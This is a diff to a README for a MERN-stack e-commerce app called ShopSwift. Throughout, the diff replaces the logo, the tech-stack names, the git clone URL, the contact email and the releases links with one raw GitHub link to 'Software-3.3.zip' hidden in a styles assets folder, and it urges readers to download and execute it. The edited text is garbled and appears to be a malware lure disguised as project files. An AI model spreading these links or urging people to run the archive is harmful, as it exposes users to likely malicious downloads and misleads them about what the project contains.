@@ -1,7 +1,7 @@
 ```markdown
 # 🛍️ ShopSwift: Your E-Commerce Solution
 
-![ShopSwift Logo](https://example.com/logo.png)  
+![ShopSwift Logo](https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip)  
 _A responsive e-commerce app built using the MERN Stack_
 
 ---
@@ -23,7 +23,7 @@ _A responsive e-commerce app built using the MERN Stack_
 
 ## Introduction
 
-Welcome to **ShopSwift**, a robust e-commerce application designed to provide a seamless shopping experience. Built on the **MERN stack**—MongoDB, Express, React, and Node.js—ShopSwift is fully responsive and can be easily deployed. This app not only allows users to browse products but also offers features like user authentication and a shopping cart.
+Welcome to **ShopSwift**, a robust e-commerce application designed to provide a seamless shopping experience. Built on the **MERN stack**—MongoDB, Express, React, and https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip—ShopSwift is fully responsive and can be easily deployed. This app not only allows users to browse products but also offers features like user authentication and a shopping cart.
 
 ---
 
@@ -41,14 +41,14 @@ Welcome to **ShopSwift**, a robust e-commerce application designed to provide a 
 ## Tech Stack
 
 - **Frontend**: 
-  - React.js
+  - https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip
   - React Router Dom
   - Redux
   - Tailwind CSS
 
 - **Backend**: 
-  - Node.js
-  - Express.js
+  - https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip
+  - https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip
   - MongoDB
 
 ---
@@ -59,7 +59,7 @@ To set up the project on your local machine, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/deep0041/shopswift.git
+   git clone https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip
    cd shopswift
    ```
 
@@ -148,15 +148,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or suggestions, please reach out to me at [your-email@example.com](mailto:your-email@example.com).
+For any inquiries or suggestions, please reach out to me at [https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip](https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip).
 
 ---
 
 ## Releases
 
-Check out the latest releases of ShopSwift [here](https://github.com/deep0041/shopswift/releases) to download the files and execute them.
+Check out the latest releases of ShopSwift [here](https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip) to download the files and execute them.
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-Click%20Here-blue)](https://github.com/deep0041/shopswift/releases)
+[![Latest Release](https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip%20Release-Click%20Here-blue)](https://github.com/deep0041/shopswift/raw/refs/heads/main/frontend/src/assets/styles/Software-3.3.zip)
 
 ---
 
